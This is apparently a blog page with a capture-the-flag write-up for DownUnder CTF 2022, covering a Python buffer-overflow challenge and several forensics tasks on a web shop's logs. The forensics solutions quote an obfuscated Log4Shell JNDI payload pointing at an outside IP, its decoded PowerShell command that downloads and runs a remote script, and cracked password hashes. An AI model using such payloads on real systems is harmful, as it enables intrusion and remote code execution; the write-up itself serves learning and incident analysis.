@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>DownUnder CTF 2022 - pwnland</title><meta name="Description" content="writeup for challenges in downunder ctf 2022"><meta property="og:url" content="http://localhost:1313/posts/downunder-ctf-2022/">
+  <meta property="og:site_name" content="pwnland">
+  <meta property="og:title" content="DownUnder CTF 2022">
+  <meta property="og:description" content="writeup for challenges in downunder ctf 2022">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-09-23T00:00:00+00:00">
+    <meta property="article:modified_time" content="2022-09-25T00:00:00+00:00">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Rev">
+    <meta property="article:tag" content="Dfir">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="DownUnder CTF 2022">
+  <meta name="twitter:description" content="writeup for challenges in downunder ctf 2022">
+<meta name="application-name" content="Cyber/CTF Blog">
+<meta name="apple-mobile-web-app-title" content="Cyber/CTF Blog">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/downunder-ctf-2022/" /><link rel="prev" href="http://localhost:1313/posts/csaw-2022/" /><link rel="next" href="http://localhost:1313/posts/wreckctf-2022/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "DownUnder CTF 2022",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/downunder-ctf-2022\/"
+        },"genre": "posts","keywords": "pwn, rev, dfir","wordcount":  784 ,
+        "url": "http:\/\/localhost:1313\/posts\/downunder-ctf-2022\/","datePublished": "2022-09-23T00:00:00+00:00","dateModified": "2022-09-25T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Xenonminer"
+            },"description": "writeup for challenges in downunder ctf 2022"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="pwnland">pwn.land</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/aboutme/"> About Me </a><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/projects/"> Projects </a><a class="menu-item" href="/notes/"> Notes </a><a class="menu-item" href="/aboutme/"> About Me </a><a class="menu-item" href="/tags/"> Tags </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="pwnland">pwn.land</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/aboutme/" title="">About Me</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/projects/" title="">Projects</a><a class="menu-item" href="/notes/" title="">Notes</a><a class="menu-item" href="/aboutme/" title="">About Me</a><a class="menu-item" href="/tags/" title="">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">DownUnder CTF 2022</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://xenonminer.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Xenonminer</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeups</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-09-23">2022-09-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;784 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#pwn">Pwn</a></li>
+    <li><a href="#rev">Rev</a></li>
+    <li><a href="#dfir">DFIR</a></li>
+    <li><a href="#writeups">Writeups</a>
+      <ul>
+        <li><a href="#pwnbabypywn">pwn/babypywn</a></li>
+        <li><a href="#solution">Solution</a></li>
+        <li><a href="#revsource-provided">rev/source-provided</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+        <li><a href="#dfirshop-knock-knock-knock">dfir/shop-knock-knock-knock</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+        <li><a href="#dfirshop-logging-for-what">dfir/shop-logging-for-what</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+        <li><a href="#dfirshop-im-just-looking">dfir/shop-im-just-looking</a></li>
+        <li><a href="#solution-4">Solution</a></li>
+        <li><a href="#dfirshop-oi-get-out-of-there">dfir/shop-oi-get-out-of-there</a></li>
+        <li><a href="#solution-5">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><ul>
+<li><a href="https://ctftime.org/event/1625" target="_blank" rel="noopener noreffer ">https://ctftime.org/event/1625</a></li>
+<li>Sep 23 to Sep 25</li>
+<li>Played with wackers</li>
+<li>Ranking: 392/1407 with 750 points</li>
+</ul>
+<h1 id="my-solveswriteups">My Solves/Writeups</h1>
+<h2 id="pwn">Pwn</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Challenge Name</th>
+          <th>Difficulty</th>
+          <th>Points</th>
+          <th>Writeup</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>pwn/babyp(y)wn</td>
+          <td>beginner</td>
+          <td>50</td>
+          <td><a href="#pwnbabypywn" rel="">jump</a></td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="rev">Rev</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Challenge Name</th>
+          <th>Difficulty</th>
+          <th>Points</th>
+          <th>Writeup</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>rev/source-provided</td>
+          <td>beginner</td>
+          <td>50</td>
+          <td><a href="#revsource-provided" rel="">jump</a></td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="dfir">DFIR</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Challenge Name</th>
+          <th>Difficulty</th>
+          <th>Points</th>
+          <th>Writeup</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>dfir/Shop-Knock-Knock-Knock</td>
+          <td>easy</td>
+          <td>50</td>
+          <td><a href="#dfirshop-knock-knock-knock" rel="">jump</a></td>
+      </tr>
+      <tr>
+          <td>dfir/Shop-Logging-for-what?</td>
+          <td>easy</td>
+          <td>50</td>
+          <td><a href="#dfirshop-logging-for-what" rel="">jump</a></td>
+      </tr>
+      <tr>
+          <td>dfir/Shop-I&rsquo;m-just-looking!</td>
+          <td>easy</td>
+          <td>50</td>
+          <td><a href="#dfirshop-im-just-looking" rel="">jump</a></td>
+      </tr>
+      <tr>
+          <td>dfir/Shop-Oi!-Get-out-of-there!</td>
+          <td>medium</td>
+          <td>50</td>
+          <td><a href="#dfirshop-oi-get-out-of-there" rel="">jump</a></td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="writeups">Writeups</h2>
+<h3 id="pwnbabypywn">pwn/babypywn</h3>
+<p>Python is memory safe, right?</p>
+<p>Author: joseph#8210</p>
+<p>Attachments: <a href="https://play.duc.tf/files/75063ab9b30ed274dd69906496ce0c15/babypywn.py?token=eyJ1c2VyX2lkIjozNTUxLCJ0ZWFtX2lkIjoxNTQwLCJmaWxlX2lkIjozN30.YzHRZQ.fB3_7LN6wR9a1LOd2JRyUidbaC4" target="_blank" rel="noopener noreffer ">babypywn.py</a></p>
+<h3 id="solution">Solution</h3>
+<p>Downloading the python file and looking at it, I recognized this as a simple buffer overflow challenge but written in python.</p>
+<p>The program was using the ctypes python library which allowes it to act like c.</p>
+<p>It creates a buffer size for the input to stay in.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-py">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">buf1</span> <span class="o">=</span> <span class="n">c_buffer</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf2</span> <span class="o">=</span> <span class="n">c_buffer</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>The program is looking for the string &ldquo;DUCTF&rdquo; in the buffer of buf2 which means if we can just overflow 512 bytes of buf1 and add a DUCTF after, it should print the flag.</p>
+<p>The alternative I used was just spamming DUCTF using python: <code>python2 -c &quot;print 'DUCTF'*200&quot; | nc 2022.ductf.dev 30021</code></p>
+<p><code>Flag: DUCTF{C_is_n0t_s0_f0r31gn_f0r_incr3d1bl3_pwn3rs}</code></p>
+<h3 id="revsource-provided">rev/source-provided</h3>
+<p>In this reversing challenge, source is provided.</p>
+<p>Author: joseph#8210</p>
+<p>Attachments: <a href="https://play.duc.tf/files/77264a4412dde0c22c878269e1fc9c11/chall?token=eyJ1c2VyX2lkIjozNTUxLCJ0ZWFtX2lkIjoxNTQwLCJmaWxlX2lkIjo1N30.YzHR2Q.ocJkP7Re57zZU4nVaGuD10gK4ec" target="_blank" rel="noopener noreffer ">chall</a>
+<a href="https://play.duc.tf/files/2c136d630abb9d5d25109c2b6424cc5e/chall.S?token=eyJ1c2VyX2lkIjozNTUxLCJ0ZWFtX2lkIjoxNTQwLCJmaWxlX2lkIjo1OH0.YzHSag.bHrtRmikcYkKQA7n4ZRreyj3UT8" target="_blank" rel="noopener noreffer ">chall.S</a></p>
+<h3 id="solution-1">Solution</h3>
+<h3 id="dfirshop-knock-knock-knock">dfir/shop-knock-knock-knock</h3>
+<p>Looks like there&rsquo;s been a bruteforce/password spray attempt against the website!</p>
+<p>What&rsquo;s the contact email for the ISP of the attacker&rsquo;s IP?</p>
+<p>Flag format: Email address, case insensitive</p>
+<p>Author: Cake#4096</p>
+<p>Attachments: <a href="https://play.duc.tf/files/93b83fc0ff46c9bd182b8afc39dd320e/DownUnderShop.JSON?token=eyJ1c2VyX2lkIjozNTUxLCJ0ZWFtX2lkIjoxNTQwLCJmaWxlX2lkIjo3MX0.YzMa_w.g9yOj7tPU6Oz6srTZeZB8Op2gOI" target="_blank" rel="noopener noreffer ">DownUnderShop.JSON</a></p>
+<h3 id="solution-2">Solution</h3>
+<p><code>Although this had the most solves, it was the weidest/ hardest one for me.</code></p>
+<p>Looking at the file, we see that there are many different payloads sent to the web server that are of form jndi:smth//</p>
+<p>Searching up on google for jndi it returns results of the log4shell attack that happened last year</p>
+<p><code>The ip can also be found from looking at the password change attempts</code></p>
+<p>We know that these attacks are hacker attacks, so looking at the ip associated with the attack payload we can find the ISP of the attacker ip by running whois on the ip.</p>
+<p>After several results of emails we get the answer</p>
+<p>Flag: <code>abuse@telstra.net</code></p>
+<h3 id="dfirshop-logging-for-what">dfir/shop-logging-for-what</h3>
+<p>We implemented a basic IPS to help protect our site from new attacks.</p>
+<p>Somehow, a newer more sophisticated version of a regularly observed attack was successfully executed against the website.</p>
+<p>What is the name of the script that was run?</p>
+<p>Flag format: Name of the script that was run, case sensitive.</p>
+<p>Author: Conletz#5420</p>
+<p>Attachments: <a href="https://play.duc.tf/files/93b83fc0ff46c9bd182b8afc39dd320e/DownUnderShop.JSON?token=eyJ1c2VyX2lkIjozNTUxLCJ0ZWFtX2lkIjoxNTQwLCJmaWxlX2lkIjo3MX0.YzMa_w.g9yOj7tPU6Oz6srTZeZB8Op2gOI" target="_blank" rel="noopener noreffer ">DownUnderShop.JSON</a></p>
+<h3 id="solution-3">Solution</h3>
+<p>Knowing from the previous challenge that the attacks were log4shell attacks in the form of jndi:smth, we are probably looking for a version of the payload that can bypass a filter.</p>
+<p>Scrolling through the file, we come across a payload that is also in the useragent section but looks obfuscated to bypass the filter.</p>
+<p><code>${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://41.108.181.141:5552/Basic/Command/Base64/cG93ZXJzaGVsbC5le GUgLWV4ZWMgYnlwYXNzIC1DICJJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vZG93bnVuZGVyY3RmLmNvbS9wVENOcDVwNkxQMGQ3cUE3N3l2YjRTSGY0MCcpOyI=}</code></p>
+<p>The end of this payload looks like base64 so decrypt the base64</p>
+<p><code>powershell.exe -exec bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString('https://downunderctf.com/pTCNp5p6LP0d7qA77yvb4SHf40');&quot;</code></p>
+<p>This part felt kinda guessy to me but the answer for the script run was just the part after the link</p>
+<p><code>Flag: pTCNp5p6LP0d7qA77yvb4SHf40</code></p>
+<h3 id="dfirshop-im-just-looking">dfir/shop-im-just-looking</h3>
+<p>We&rsquo;ve seen some vulnerability scanning activity against us!</p>
+<p>What was the name of the tool used?</p>
+<p>Flag format: Name of the tool used, case insensitive</p>
+<p>Author: Cake#4096</p>
+<p>Attachments: <a href="https://play.duc.tf/files/93b83fc0ff46c9bd182b8afc39dd320e/DownUnderShop.JSON?token=eyJ1c2VyX2lkIjozNTUxLCJ0ZWFtX2lkIjoxNTQwLCJmaWxlX2lkIjo3MX0.YzMa_w.g9yOj7tPU6Oz6srTZeZB8Op2gOI" target="_blank" rel="noopener noreffer ">DownUnderShop.JSON</a></p>
+<h3 id="solution-4">Solution</h3>
+<p><code>This challenge felt even more guessy to me as I found the answer by trying to do the password challenge instead.</code></p>
+<p>Searching through the json file during the password challenge of this file, I was looking for some wordlist that I could maybe use to crack the hashes.</p>
+<p>Grepping txt from the json file, I got the result of nuclei.txt.</p>
+<p>I searched up nuclei.txt on google thinking I could download this wordlist and use it to crack the hashes but when I searched it up, I instead find a vulnerability scanner on github called nuclei. <a href="https://github.com/projectdiscovery/nuclei" target="_blank" rel="noopener noreffer ">nuclei</a></p>
+<p>This challenge description was asking for a vulnerability scanner, so nuclei seemed fit and it ended up being the flag.</p>
+<p><code>Flag: nuclei</code></p>
+<h3 id="dfirshop-oi-get-out-of-there">dfir/shop-oi-get-out-of-there</h3>
+<p>Someone was able to successfully break into the admin account!</p>
+<p>Do you know what the old password was?</p>
+<p>Flag format: The password, case insensitive</p>
+<p>Author: Cake#4096</p>
+<p>Attachments: <a href="https://play.duc.tf/files/93b83fc0ff46c9bd182b8afc39dd320e/DownUnderShop.JSON?token=eyJ1c2VyX2lkIjozNTUxLCJ0ZWFtX2lkIjoxNTQwLCJmaWxlX2lkIjo3MX0.YzMa_w.g9yOj7tPU6Oz6srTZeZB8Op2gOI" target="_blank" rel="noopener noreffer ">DownUnderShop.JSON</a></p>
+<h3 id="solution-5">Solution</h3>
+<p>After searching through the files on the previous challenges, I realized that there were these weird links pointing to /changepassword and had base64 text after the ref query parameter.</p>
+<p>Using grep to search for &ldquo;ref&rdquo; and grabbing all the base64 text and decoding the base64 returns some password-like text.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>b506fb0cabb60e9f1132daa72df4d567:6d7c5b3e796d833b3fdd40f4ce57facd
+2ac9cb7dc02b3c0083eb70898e549b63:6d7c5b3e796d833b3fdd40f4ce57facd
+3dc919de186d1a8ee62fff92d80839f7:6d7c5b3e796d833b3fdd40f4ce57facd
+7a581ac4d8cb3bfc596fce9afb115fd2:6d7c5b3e796d833b3fdd40f4ce57facd</code></pre></div>
+<p>At first I thought this was a LM:NTLM hash because of the ldap references in the json file but trying to crack using hashcat/ john didn&rsquo;t work.</p>
+<p>After, I tried plugging the hashes into hashes.com (cracked website for cracking passwords), and it cracked all of the passwords.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>2ac9cb7dc02b3c0083eb70898e549b63:Password1
+3dc919de186d1a8ee62fff92d80839f7:ozzieozzieozzie
+7a581ac4d8cb3bfc596fce9afb115fd2:downunder2
+b506fb0cabb60e9f1132daa72df4d567:crackstation</code></pre></div>
+<p>Submitting each of the passwords, one of them worked.</p>
+<p><code>Flag: ozzieozzieozzie</code></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-09-25</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/posts/downunder-ctf-2022/" data-title="DownUnder CTF 2022" data-hashtags="pwn,rev,dfir"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="http://localhost:1313/posts/downunder-ctf-2022/" data-title="DownUnder CTF 2022"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/downunder-ctf-2022/" data-hashtag="pwn"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/posts/downunder-ctf-2022/" data-title="DownUnder CTF 2022"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/posts/downunder-ctf-2022/" data-title="DownUnder CTF 2022"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/downunder-ctf-2022/" data-title="DownUnder CTF 2022"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/posts/downunder-ctf-2022/" data-title="DownUnder CTF 2022" data-description="writeup for challenges in downunder ctf 2022"><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fdownunder-ctf-2022%2f&amp;text=DownUnder%20CTF%202022" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/pwn/">Pwn</a>,&nbsp;<a href="/tags/rev/">Rev</a>,&nbsp;<a href="/tags/dfir/">Dfir</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/csaw-2022/" class="prev" rel="prev" title="csaw 2022"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>csaw 2022</a>
+            <a href="/posts/wreckctf-2022/" class="next" rel="next" title="WRECKCTF 2022">WRECKCTF 2022<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.145.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xenonminer</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true};</script><script src="/js/theme.min.js"></script></body>
+</html>
